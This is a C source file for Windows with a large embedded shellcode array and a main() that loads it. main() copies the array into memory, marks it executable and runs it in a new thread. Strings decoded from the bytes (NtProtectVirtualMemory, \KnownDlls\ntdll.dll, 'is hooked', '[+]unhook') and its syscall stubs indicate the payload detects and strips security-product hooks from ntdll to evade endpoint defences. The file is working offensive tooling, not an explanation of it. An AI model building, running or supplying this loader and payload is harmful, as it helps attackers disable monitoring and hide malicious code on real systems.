#include <windows.h>
#include <stdio.h>

//kali -c x86_64-w64-mingw32-gcc test.c -o compiled/test.exe ; compiled\test.exe
unsigned char shellcode[] = "\x57\x48\x89\xe7\x48\x83\xe4\xf0\x48\x83\xec\x20\xe8\x9f\x0d\x00\x00\x48\x89\xfc\x5f\xc3\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x00\x48\x83\xec\x18\x49\x89\xc9\x48\x89\xc8\x41\x89\xd2\x4c\x8d\x41\x0b\x48\x8d\x4c\x24\x05\xba\x4c\x00\x00\x00\x4c\x29\xc9\xeb\x04\x0f\xb6\x14\x08\x88\x10\x48\x83\xc0\x01\x4c\x39\xc0\x75\xf1\x45\x89\x51\x04\x4c\x89\xc8\x48\x83\xc4\x18\xc3\x90\x90\x90\x90\x90\xe8\x00\x00\x00\x00\x58\x48\x83\xe8\x05\xc3\x0f\x1f\x44\x00\x00\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x48\x8b\x40\x18\x4c\x8b\x50\x20\x4d\x85\xd2\x74\x65\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x00\x41\x0f\xb7\x42\x48\x4d\x8b\x42\x50\x44\x8d\x48\xff\x49\x8d\x48\x01\x31\xc0\x45\x0f\xb7\xc9\x49\x01\xc9\xeb\x18\x0f\x1f\x40\x00\x83\xe8\x20\x49\x89\xc8\x48\x98\x48\x01\xd0\x49\x39\xc9\x74\x1c\x48\x83\xc1\x01\x89\xc2\x41\x0f\xb6\x00\xc1\xca\x0d\x3c\x60\x77\xdf\x48\x01\xd0\x49\x89\xc8\x49\x39\xc9\x75\xe4\x3d\x5b\xbc\x4a\x6a\x74\x0c\x4d\x8b\x12\x4d\x85\xd2\x75\xa5\x4c\x89\xd0\xc3\x4d\x8b\x52\x20\x4c\x89\xd0\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x48\x8b\x40\x18\x4c\x8b\x50\x20\x4d\x85\xd2\x74\x65\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x00\x41\x0f\xb7\x42\x48\x4d\x8b\x42\x50\x44\x8d\x48\xff\x49\x8d\x48\x01\x31\xc0\x45\x0f\xb7\xc9\x49\x01\xc9\xeb\x18\x0f\x1f\x40\x00\x83\xe8\x20\x49\x89\xc8\x48\x98\x48\x01\xd0\x49\x39\xc9\x74\x1c\x48\x83\xc1\x01\x89\xc2\x41\x0f\xb6\x00\xc1\xca\x0d\x3c\x60\x77\xdf\x48\x01\xd0\x49\x89\xc8\x49\x39\xc9\x75\xe4\x3d\x5d\x68\xfa\x3c\x74\x0c\x4d\x8b\x12\x4d\x85\xd2\x75\xa5\x4c\x89\xd0\xc3\x4d\x8b\x52\x20\x4c\x89\xd0\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x85\xc9\x0f\x84\xbb\x00\x00\x00\x57\x49\x89\xc9\x49\x89\xd2\x56\x53\x48\x63\x41\x3c\x8b\x84\x01\x88\x00\x00\x00\x48\x01\xc8\x8b\x70\x1c\x48\x01\xce\xf7\xc2\x00\x00\xff\xff\x74\x6a\x8b\x48\x18\x8d\x51\xff\x85\xc9\x74\x55\x44\x8b\x40\x20\x44\x8b\x58\x24\x4d\x01\xc8\x4d\x01\xcb\x49\x8d\x5c\x90\x04\x0f\x1f\x44\x00\x00\x41\x8b\x00\x4c\x89\xd7\x4c\x01\xc8\x48\x29\xc7\xeb\x06\x66\x90\x38\xca\x75\x4c\x48\x89\xc2\x48\x83\xc0\x01\x0f\xb6\x4c\x38\xff\x0f\xb6\x12\x84\xd2\x75\xe9\x0f\xb6\xd1\xf7\xda\x85\xd2\x74\x36\x49\x83\xc0\x04\x49\x83\xc3\x02\x49\x39\xd8\x75\xc3\x5b\x31\xc0\x5e\x5f\xc3\x0f\x1f\x44\x00\x00\x8b\x40\x10\x44\x0f\xb7\xd2\x5b\x49\x29\xc2\x42\x8b\x04\x96\x5e\x5f\x48\x01\xc8\xc3\x0f\x1f\x00\x29\xca\x85\xd2\x75\xca\x41\x0f\xb7\x03\x5b\x8b\x04\x86\x5e\x5f\x4c\x01\xc8\xc3\x31\xc0\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x41\x54\x55\x4c\x89\xcd\x57\x4c\x89\xc7\x56\x48\x89\xd6\x53\x48\x89\xcb\x48\x83\xec\x70\xe8\xf5\xfd\xff\xff\x48\x8d\x54\x24\x47\xc6\x44\x24\x53\x00\x49\x89\xc4\xc7\x44\x24\x4f\x61\x72\x79\x41\x48\xb8\x4c\x6f\x61\x64\x4c\x69\x62\x72\x4c\x89\xe1\x48\x89\x44\x24\x47\xe8\xe9\xfe\xff\xff\x48\x89\x03\x48\x85\xc0\x75\x11\x31\xc0\x48\x83\xc4\x70\x5b\x5e\x5f\x5d\x41\x5c\xc3\x0f\x1f\x40\x00\x48\x8d\x54\x24\x54\x4c\x89\xe1\x48\xb8\x56\x69\x72\x74\x75\x61\x6c\x41\xc7\x44\x24\x5c\x6c\x6c\x6f\x63\x48\x89\x44\x24\x54\xc6\x44\x24\x60\x00\xe8\xa7\xfe\xff\xff\x48\x89\x06\x48\x85\xc0\x74\xbe\x41\xb8\x63\x74\x00\x00\x48\x8d\x54\x24\x61\x4c\x89\xe1\xc6\x44\x24\x6f\x00\x48\xb8\x56\x69\x72\x74\x75\x61\x6c\x50\xc7\x44\x24\x69\x72\x6f\x74\x65\x48\x89\x44\x24\x61\x66\x44\x89\x44\x24\x6d\xe8\x6a\xfe\xff\xff\x48\x89\x07\x48\x85\xc0\x74\x81\xba\x6c\x6c\x00\x00\x48\x8d\x4c\x24\x31\xc6\x44\x24\x3b\x00\x48\xb8\x6d\x73\x76\x63\x72\x74\x2e\x64\x66\x89\x54\x24\x39\x48\x89\x44\x24\x31\xff\x13\xb9\x74\x66\x00\x00\x48\x8d\x54\x24\x2a\xc7\x44\x24\x2a\x70\x72\x69\x6e\x66\x89\x4c\x24\x2e\x48\x89\xc1\x49\x89\xc4\xc6\x44\x24\x30\x00\xe8\x16\xfe\xff\xff\x48\x89\x45\x00\x48\x85\xc0\x0f\x84\x28\xff\xff\xff\x48\x8d\x54\x24\x3c\x4c\x89\xe1\xc6\x44\x24\x46\x00\x48\xb8\x73\x77\x70\x72\x69\x6e\x74\x66\x48\x89\x44\x24\x3c\xb8\x5f\x73\x00\x00\x66\x89\x44\x24\x44\xe8\xde\xfd\xff\xff\x48\x8b\x94\x24\xc0\x00\x00\x00\x48\x85\xc0\x48\x89\x02\x0f\x95\xc0\x0f\xb6\xc0\xe9\xe6\xfe\xff\xff\x90\x90\x90\x90\x90\x41\x54\x41\xba\x61\x00\x00\x00\x55\x57\x56\x53\x48\x83\xec\x40\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x48\x8b\x40\x18\xc7\x44\x24\x2e\x2e\x64\x61\x74\x66\x44\x89\x54\x24\x32\x4c\x8b\x58\x20\x4d\x85\xdb\x74\x67\x49\x89\xca\x48\x89\xd7\x4c\x89\xc3\x4c\x89\xce\x41\x0f\xb7\x43\x48\x4d\x8b\x43\x50\x44\x8d\x48\xff\x49\x8d\x48\x01\x31\xc0\x45\x0f\xb7\xc9\x49\x01\xc9\xeb\x18\x0f\x1f\x40\x00\x83\xe8\x20\x49\x89\xc8\x48\x98\x48\x01\xd0\x4c\x39\xc9\x74\x1c\x48\x83\xc1\x01\x89\xc2\x41\x0f\xb6\x00\xc1\xca\x0d\x3c\x60\x77\xdf\x48\x01\xd0\x49\x89\xc8\x4c\x39\xc9\x75\xe4\x3d\x5d\x68\xfa\x3c\x74\x15\x4d\x8b\x1b\x4d\x85\xdb\x75\xa5\x48\x83\xc4\x40\x31\xc0\x5b\x5e\x5f\x5d\x41\x5c\xc3\x49\x8b\x6b\x20\x48\x63\x45\x3c\x48\x01\xe8\x0f\xb7\x50\x14\x4c\x8d\x4c\x10\x18\x0f\xb7\x40\x06\x66\x85\xc0\x74\xd6\x83\xe8\x01\x0f\xb7\xc0\x48\x8d\x04\x80\x4d\x8d\x5c\xc1\x28\x0f\x1f\x40\x00\x41\x0f\xb6\x01\x4c\x89\xc9\x41\xb8\x2e\x00\x00\x00\x48\x8d\x54\x24\x2e\x84\xc0\x75\x16\xeb\x19\x0f\xb6\x41\x01\x48\x83\xc1\x01\x48\x83\xc2\x01\x44\x0f\xb6\x02\x84\xc0\x74\x14\x44\x38\xc0\x74\xe7\x49\x83\xc1\x28\x4d\x39\xd9\x75\xc6\xeb\x87\x0f\x1f\x40\x00\x45\x84\xc0\x75\xec\x41\x8b\x41\x0c\x41\x8b\x51\x08\x48\x01\xe8\x0f\x84\x6d\xff\xff\xff\x83\xfa\x50\x0f\x86\x64\xff\xff\xff\x8d\x4a\xaf\x48\x01\xc1\xeb\x11\x90\x48\x8d\x50\x01\x48\x39\xc1\x0f\x84\x4e\xff\xff\xff\x48\x89\xd0\x81\x38\x4c\x8b\xd1\xb8\x75\xe8\x81\x78\x10\x4c\x8b\xd1\xb8\x75\xdf\x81\x78\x20\x4c\x8b\xd1\xb8\x75\xd6\x81\x78\x30\x4c\x8b\xd1\xb8\x75\xcd\x81\x78\x40\x4c\x8b\xd1\xb8\x75\xc4\x44\x8b\x60\x34\x8b\x68\x44\x45\x85\xe4\x0f\x84\x0f\xff\xff\xff\x85\xed\x0f\x84\x07\xff\xff\xff\x41\xb9\x04\x00\x00\x00\x41\xb8\x00\x30\x00\x00\xba\x80\x00\x00\x00\x31\xc9\x41\xff\xd2\x49\x89\xc2\x48\x85\xc0\x0f\x84\xe5\xfe\xff\xff\x4c\x8d\x58\x40\xba\x0f\x05\x00\x00\xb8\x4c\x8b\xd1\xb8\xc6\x44\x24\x3e\xc3\x4c\x8d\x4c\x24\x34\x48\x89\x44\x24\x34\x48\x8d\x4c\x24\x3f\x41\xb8\x4c\x00\x00\x00\x66\x89\x54\x24\x3c\x4c\x89\xc8\x4c\x89\xda\xeb\x09\x0f\x1f\x44\x00\x00\x44\x0f\xb6\x00\x48\x83\xc0\x01\x44\x88\x02\x48\x83\xc2\x01\x48\x39\xc8\x75\xec\xb8\x4c\x8b\xd1\xb8\x45\x89\x62\x44\x41\xb8\x4c\x00\x00\x00\x4c\x89\x1b\x4d\x8d\x9a\x80\x00\x00\x00\x48\x89\x44\x24\x34\xb8\x0f\x05\x00\x00\x4c\x89\xda\x66\x89\x44\x24\x3c\x4c\x89\xc8\xc6\x44\x24\x3e\xc3\xeb\x0b\x0f\x1f\x80\x00\x00\x00\x00\x44\x0f\xb6\x00\x48\x83\xc0\x01\x44\x88\x02\x48\x83\xc2\x01\x48\x39\xc8\x75\xec\x41\x89\xaa\x84\x00\x00\x00\x4c\x89\x1e\x48\x83\x3b\x00\x0f\x84\x33\xfe\xff\xff\x4d\x85\xdb\x0f\x84\x2a\xfe\xff\xff\x41\xb8\x20\x00\x00\x00\xba\x80\x00\x00\x00\x4c\x89\xd1\xff\xd7\x85\xc0\x0f\x95\xc0\x48\x83\xc4\x40\x5b\x0f\xb6\xc0\x5e\x5f\x5d\x41\x5c\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x89\xc8\x41\xb8\x01\x00\x00\x00\x83\xe0\xdf\x83\xe8\x41\x3c\x19\x76\x0d\x83\xe9\x30\x45\x31\xc0\x80\xf9\x09\x41\x0f\x96\xc0\x44\x89\xc0\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x0f\xb6\x01\x49\x89\xc9\x84\xc0\x74\x56\x49\xba\xfb\x1f\x00\x00\x00\x00\x04\x00\xba\x01\x00\x00\x00\xeb\x28\x0f\x1f\x44\x00\x00\x49\x0f\xa3\xc2\x73\x31\x41\x0f\xb6\x04\x11\x81\xfa\x80\x00\x00\x00\x41\x0f\x95\xc0\x84\xc0\x0f\x95\xc1\x48\x83\xc2\x01\x41\x84\xc8\x74\x1d\x89\xc1\x83\xe1\xdf\x83\xe9\x41\x80\xf9\x19\x76\xd6\x83\xe8\x2d\x3c\x32\x76\xc9\x31\xc0\xc3\x66\x0f\x1f\x44\x00\x00\xb8\x01\x00\x00\x00\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x85\xc9\x74\x29\x48\x85\xd2\x74\x24\x4d\x85\xc0\x74\x29\x31\xc0\xeb\x10\x0f\x1f\x44\x00\x00\x77\x26\x48\x83\xc0\x01\x49\x39\xc0\x74\x15\x44\x0f\xb6\x0c\x02\x44\x38\x0c\x01\x73\xea\xb8\xff\xff\xff\xff\xc3\x0f\x1f\x40\x00\x31\xc0\xc3\x0f\x1f\x44\x00\x00\xb8\x01\x00\x00\x00\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x49\x89\xc9\x49\x89\xd0\x31\xc0\xeb\x0e\x66\x0f\x1f\x44\x00\x00\x48\x83\xc0\x01\x38\xca\x75\x18\x41\x0f\xb6\x14\x01\x41\x0f\xb6\x0c\x00\x84\xd2\x75\xea\x0f\xb6\xc1\xf7\xd8\xc3\x0f\x1f\x40\x00\x0f\xb6\xc2\x29\xc8\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x0f\xb6\x01\x49\x89\xca\x49\x89\xd3\x31\xc9\x84\xc0\x75\x3a\xeb\x41\x0f\x1f\x80\x00\x00\x00\x00\x44\x8d\x48\xbf\x44\x8d\x40\x20\x41\x80\xf9\x1a\x44\x8d\x4a\xbf\x41\x0f\x42\xc0\x44\x8d\x42\x20\x41\x80\xf9\x1a\x41\x0f\x42\xd0\x38\xc2\x75\x24\x48\x83\xc1\x01\x41\x0f\xb6\x04\x0a\x84\xc0\x74\x09\x41\x0f\xb6\x14\x0b\x84\xd2\x75\xc6\xb8\x01\x00\x00\x00\xc3\x0f\x1f\x84\x00\x00\x00\x00\x00\x31\xc0\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x49\x89\xd1\x45\x85\xc0\x7e\x19\x4d\x63\xc0\x31\xc0\x0f\x1f\x00\x41\x0f\xb6\x14\x01\x88\x14\x01\x48\x83\xc0\x01\x4c\x39\xc0\x75\xef\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x8d\x51\xbf\x8d\x41\x20\x80\xfa\x1a\x0f\x43\xc1\xc3\x90\x90\x90\x48\xb8\x20\x69\x73\x20\x68\x6f\x6f\x6b\x41\x57\x41\x56\x41\x55\x41\x54\x4d\x89\xcc\x55\x4c\x89\xc5\x57\x48\x89\xd7\x48\xba\x6e\x69\x63\x6f\x64\x65\x53\x74\x56\x53\x48\x89\xcb\x48\x81\xec\xa8\x01\x00\x00\x48\x89\x84\x24\xc4\x00\x00\x00\x48\xb8\x52\x74\x6c\x49\x6e\x69\x74\x55\x48\x89\x94\x24\xe8\x00\x00\x00\x48\x8d\x94\x24\xe0\x00\x00\x00\xc7\x84\x24\x90\x00\x00\x00\x0b\x01\x00\x00\x48\xc7\x84\x24\xa0\x00\x00\x00\x00\x00\x00\x00\xc7\x84\x24\x94\x00\x00\x00\x0b\x02\x00\x00\xc7\x84\x24\xcc\x00\x00\x00\x65\x64\x0a\x00\x48\x89\x84\x24\xe0\x00\x00\x00\xc7\x84\x24\xf0\x00\x00\x00\x72\x69\x6e\x67\xc6\x84\x24\xf4\x00\x00\x00\x00\xe8\x9e\xf8\xff\xff\x48\x85\xc0\x75\x19\x31\xc0\x48\x81\xc4\xa8\x01\x00\x00\x5b\x5e\x5f\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3\x0f\x1f\x00\x48\x89\xc6\x48\x8d\x94\x24\xbc\x00\x00\x00\x48\x89\xd9\x48\xb8\x4e\x74\x43\x6c\x6f\x73\x65\x00\x48\x89\x84\x24\xbc\x00\x00\x00\xe8\x5b\xf8\xff\xff\x49\x89\xc6\x48\x85\xc0\x74\xba\x48\xba\x69\x65\x77\x4f\x66\x53\x65\x63\x48\x89\xd9\x48\xb8\x4e\x74\x55\x6e\x6d\x61\x70\x56\xc7\x84\x24\x10\x01\x00\x00\x74\x69\x6f\x6e\x48\x89\x94\x24\x08\x01\x00\x00\x48\x8d\x94\x24\x00\x01\x00\x00\x48\x89\x84\x24\x00\x01\x00\x00\xc6\x84\x24\x14\x01\x00\x00\x00\xe8\x0c\xf8\xff\xff\x48\x89\x44\x24\x68\x48\x85\xc0\x0f\x84\x65\xff\xff\xff\x48\xba\x74\x56\x69\x72\x74\x75\x61\x6c\x48\x89\xd9\x48\xb8\x4e\x74\x50\x72\x6f\x74\x65\x63\xc7\x84\x24\x30\x01\x00\x00\x4d\x65\x6d\x6f\x48\x89\x94\x24\x28\x01\x00\x00\xba\x72\x79\x00\x00\x66\x89\x94\x24\x34\x01\x00\x00\x48\x8d\x94\x24\x20\x01\x00\x00\x48\x89\x84\x24\x20\x01\x00\x00\xc6\x84\x24\x36\x01\x00\x00\x00\xe8\xaa\xf7\xff\xff\x48\x85\xc0\x0f\x84\x08\xff\xff\xff\x4c\x8d\xac\x24\xd0\x00\x00\x00\x48\x8d\x94\x24\x40\x01\x00\x00\x48\xb8\x5c\x00\x4b\x00\x6e\x00\x6f\x00\x48\x89\x84\x24\x40\x01\x00\x00\x4c\x89\xe9\x48\xb8\x77\x00\x6e\x00\x44\x00\x6c\x00\x48\x89\x84\x24\x48\x01\x00\x00\x48\xb8\x6c\x00\x73\x00\x5c\x00\x6e\x00\x48\x89\x84\x24\x50\x01\x00\x00\x48\xb8\x74\x00\x64\x00\x6c\x00\x6c\x00\x48\x89\x84\x24\x58\x01\x00\x00\x48\x83\xe8\x46\x48\x89\x84\x24\x60\x01\x00\x00\x31\xc0\x66\x89\x84\x24\x68\x01\x00\x00\xff\xd6\x48\x8d\x8c\x24\xa8\x00\x00\x00\x4c\x89\xac\x24\x80\x01\x00\x00\x4c\x8d\x84\x24\x70\x01\x00\x00\xc7\x84\x24\x70\x01\x00\x00\x30\x00\x00\x00\xba\x04\x00\x00\x00\x48\xc7\x84\x24\x78\x01\x00\x00\x00\x00\x00\x00\xc7\x84\x24\x88\x01\x00\x00\x00\x00\x00\x00\x48\xc7\x84\x24\x90\x01\x00\x00\x00\x00\x00\x00\x48\xc7\x84\x24\x98\x01\x00\x00\x00\x00\x00\x00\x48\xc7\x84\x24\xa8\x00\x00\x00\x00\x00\x00\x00\x48\xc7\x84\x24\xb0\x00\x00\x00\x00\x00\x00\x00\xff\xd5\x48\x8b\x8c\x24\xa8\x00\x00\x00\x48\x85\xc9\x0f\x84\x13\xfe\xff\xff\x48\x8d\x84\x24\xb0\x00\x00\x00\xc7\x44\x24\x48\x02\x00\x00\x00\x45\x31\xc9\x4c\x8d\x84\x24\xa0\x00\x00\x00\xc7\x44\x24\x40\x00\x00\x00\x00\x48\xc7\xc2\xff\xff\xff\xff\xc7\x44\x24\x38\x01\x00\x00\x00\x48\x89\x44\x24\x30\x48\xc7\x44\x24\x28\x00\x00\x00\x00\x48\xc7\x44\x24\x20\x00\x00\x00\x00\x41\xff\xd4\x4c\x8b\xac\x24\xa0\x00\x00\x00\x4d\x85\xed\x74\x40\x49\x63\x45\x3c\x8b\x8c\x24\x90\x00\x00\x00\x4c\x01\xe8\x0f\xb7\x50\x18\x39\xca\x74\x3d\x8b\x8c\x24\x94\x00\x00\x00\x48\x05\x88\x00\x00\x00\x39\xca\x74\x30\x48\x8b\x44\x24\x68\x4c\x89\xea\x48\xc7\xc1\xff\xff\xff\xff\xff\xd0\x85\xc0\x0f\x88\x7a\xfd\xff\xff\x48\x8b\x8c\x24\xa8\x00\x00\x00\x41\xff\xd6\xe9\x6a\xfd\xff\xff\x0f\x1f\x00\x48\x83\xc0\x78\x44\x8b\x38\x4b\x8d\x44\x3d\x00\x8b\x68\x20\x44\x8b\x60\x24\x48\x89\x44\x24\x58\x8b\x50\x18\x4c\x01\xed\x4d\x01\xec\x8d\x42\xff\x85\xd2\x0f\x84\x54\x01\x00\x00\x48\x8d\x44\x85\x04\x4c\x89\xb4\x24\x88\x00\x00\x00\x48\x89\x44\x24\x60\x48\x8d\x84\x24\xc4\x00\x00\x00\x48\x89\x44\x24\x70\x48\x8d\x84\x24\x98\x00\x00\x00\x48\x89\x44\x24\x78\x48\x8d\x84\x24\x9c\x00\x00\x00\x48\x89\x84\x24\x80\x00\x00\x00\x48\x89\xbc\x24\xf8\x01\x00\x00\xeb\x29\x66\x0f\x1f\x44\x00\x00\x3a\x06\x75\x76\x0f\xb6\x47\x01\x38\x46\x01\x75\x6d\x0f\x1f\x00\x48\x83\xc5\x04\x49\x83\xc4\x02\x48\x3b\x6c\x24\x60\x0f\x84\xd5\x00\x00\x00\x48\x8b\x44\x24\x58\x41\x0f\xb7\x14\x24\x8b\x40\x1c\x4c\x01\xe8\x8b\x34\x90\x4c\x01\xee\x48\x89\xf1\x49\x89\xf7\xe8\x54\xfa\xff\xff\x85\xc0\x75\xc8\x44\x8b\x45\x00\x48\x89\xd9\x4f\x8d\x74\x05\x00\x4c\x89\xf2\xe8\x2c\xf5\xff\xff\x48\x89\xc7\x48\x85\xc0\x74\xac\x0f\xb6\x00\x3c\xe9\x74\x0a\x3c\xff\x75\xa1\x80\x7f\x01\x25\x75\x9b\x48\x85\xf6\x75\x86\x4c\x89\xf1\xff\x94\x24\x10\x02\x00\x00\x48\x8b\x4c\x24\x70\xff\x94\x24\x10\x02\x00\x00\x4c\x8b\x4c\x24\x78\x41\xb8\x40\x00\x00\x00\x48\x89\xf9\xba\x40\x00\x00\x00\xff\x94\x24\xf8\x01\x00\x00\x85\xc0\x74\x4a\x48\x89\xfa\x48\x8d\x4e\x0a\x48\x29\xf2\x41\x0f\xb6\x07\x49\x83\xc7\x01\x41\x88\x44\x17\xff\x49\x39\xcf\x75\xee\x4c\x8b\x8c\x24\x80\x00\x00\x00\x44\x8b\x84\x24\x98\x00\x00\x00\xba\x40\x00\x00\x00\x48\x89\xf9\xff\x94\x24\xf8\x01\x00\x00\x85\xc0\x0f\x85\x1f\xff\xff\xff\x0f\x1f\x80\x00\x00\x00\x00\x4c\x8b\xb4\x24\x88\x00\x00\x00\x4c\x8b\xac\x24\xa0\x00\x00\x00\x4c\x89\xea\x48\xc7\xc1\xff\xff\xff\xff\x48\x8b\x44\x24\x68\xff\xd0\x48\x8b\x8c\x24\xa8\x00\x00\x00\x41\xff\xd6\xb8\x01\x00\x00\x00\xe9\xc3\xfb\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x0f\xb6\x01\x44\x0f\xb6\x02\x84\xc0\x75\x18\xeb\x28\x0f\x1f\x00\x0f\xb6\x41\x01\x48\x83\xc1\x01\x4c\x8d\x42\x01\x84\xc0\x74\x10\x4c\x89\xc2\x44\x0f\xb6\x02\x41\x38\xc0\x74\xe4\x44\x29\xc0\xc3\x44\x0f\xb6\x42\x01\x31\xc0\x44\x29\xc0\xc3\x90\x90\x90\x90\x90\x80\x39\x00\x74\x23\xb8\x01\x00\x00\x00\x66\x0f\x1f\x44\x00\x00\x41\x89\xc0\x48\x83\xc0\x01\x80\x7c\x01\xff\x00\x75\xf2\x44\x89\xc0\xc3\x66\x0f\x1f\x44\x00\x00\x45\x31\xc0\x44\x89\xc0\xc3\x90\x41\x55\x41\x54\x48\x81\xec\x88\x00\x00\x00\x48\x8d\x44\x24\x48\x48\x8d\x54\x24\x50\x48\x89\x44\x24\x20\x48\x8d\x4c\x24\x38\x4c\x8d\x4c\x24\x40\x4c\x8d\x44\x24\x58\xe8\x82\xf4\xff\xff\x85\xc0\x0f\x84\x1a\x01\x00\x00\x48\xb8\x5b\x2b\x5d\x49\x6e\x69\x74\x0a\x4c\x8d\x6c\x24\x76\xc6\x44\x24\x7e\x00\x4c\x89\xe9\x48\x89\x44\x24\x76\xff\x54\x24\x40\xe8\xf5\xf2\xff\xff\x49\x89\xc4\x48\x85\xc0\x0f\x84\xb9\x00\x00\x00\x41\xb8\x0a\x00\x00\x00\x4c\x89\xe9\x48\xb8\x5b\x2b\x5d\x6e\x74\x64\x6c\x6c\x66\x44\x89\x44\x24\x7e\x48\x89\x44\x24\x76\xff\x54\x24\x40\x48\x8b\x54\x24\x58\x48\x8b\x4c\x24\x50\x4c\x8d\x4c\x24\x68\x4c\x8d\x44\x24\x60\xe8\x7e\xf5\xff\xff\x85\xc0\x0f\x84\xfe\x00\x00\x00\x48\xb8\x5b\x2b\x5d\x49\x6e\x69\x74\x32\xb9\x0a\x00\x00\x00\x66\x89\x4c\x24\x7e\x4c\x89\xe9\x48\x89\x44\x24\x76\xff\x54\x24\x40\x48\x8b\x44\x24\x40\x4c\x8b\x4c\x24\x68\x4c\x89\xe1\x4c\x8b\x44\x24\x60\x48\x8b\x54\x24\x58\x48\x89\x44\x24\x20\xe8\xb5\xf9\xff\xff\x85\xc0\x0f\x85\x85\x00\x00\x00\x48\xb8\x5b\x2d\x5d\x75\x6e\x68\x6f\x6f\xba\x6b\x00\x00\x00\x4c\x89\xe9\x48\x89\x44\x24\x76\x66\x89\x54\x24\x7e\xff\x54\x24\x40\x48\x81\xc4\x88\x00\x00\x00\x41\x5c\x41\x5d\xc3\x90\x48\xb8\x5b\x2d\x5d\x6e\x74\x64\x6c\x6c\xc6\x44\x24\x7e\x00\x4c\x89\xe9\x48\x89\x44\x24\x76\xff\x54\x24\x40\x48\x81\xc4\x88\x00\x00\x00\x41\x5c\x41\x5d\xc3\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x48\xb8\x5b\x2d\x5d\x49\x6e\x69\x74\x00\x48\x8d\x4c\x24\x76\x48\x89\x44\x24\x76\xff\x54\x24\x40\x48\x81\xc4\x88\x00\x00\x00\x41\x5c\x41\x5d\xc3\x0f\x1f\x40\x00\x48\xb8\x5b\x2b\x5d\x75\x6e\x68\x6f\x6f\x4c\x89\xe9\x48\x89\x44\x24\x76\xb8\x6b\x00\x00\x00\x66\x89\x44\x24\x7e\xff\x54\x24\x40\x48\x81\xc4\x88\x00\x00\x00\x41\x5c\x41\x5d\xc3\x0f\x1f\x40\x00\x48\xb8\x5b\x2d\x5d\x49\x6e\x69\x74\x32\xc6\x44\x24\x7e\x00\x4c\x89\xe9\x48\x89\x44\x24\x76\xff\x54\x24\x40\x48\x81\xc4\x88\x00\x00\x00\x41\x5c\x41\x5d\xc3\x90\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00";

int main(){
    //LoadLibraryA("HackStrikex64.dll");
    //Sleep(5);
    //getchar();

    int size = sizeof(shellcode);
    DWORD flOldProtect;
    LPVOID addressPointer = VirtualAlloc(NULL, size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
    memcpy(addressPointer, shellcode, size);
    VirtualProtect(addressPointer, size, PAGE_EXECUTE_READ, &flOldProtect);
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, 0);
    WaitForSingleObject(hThread, INFINITE);
    
    getchar();
    return 0;
}

